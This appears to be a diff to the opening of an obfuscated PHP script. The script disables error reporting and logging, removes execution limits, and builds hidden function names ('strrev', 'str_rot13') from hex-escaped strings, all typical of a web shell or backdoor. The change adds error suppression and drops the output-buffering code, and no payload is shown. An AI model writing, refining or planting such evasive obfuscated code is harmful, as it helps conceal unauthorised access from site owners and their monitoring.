@@ -1,18 +1,11 @@
-error_reporting(0);
-set_time_limit(0);
+@error_reporting(0);
+@set_time_limit(0);
 @ini_set("output_buffering", 0);
 @ini_set("max_execution_time", 0);
 @ini_set("display_errors", 0);
 @ini_set("error_reporting", 0);
 @ini_set("log_errors", 0);
 @ini_set("error_log", null);
-@ob_start();
-@ini_set("zlib.output_compression", 0);
-@ini_set("implicit_flush", 1);
-for ($i = 0; $i < ob_get_level(); $i++) {
-  @ob_end_flush();
-}
-@ob_implicit_flush(1);
 @clearstatcache();
 $_____0 = "st\x72\x72\x65v";
 $______0 = "s\x74r_r\x6ft\x313";
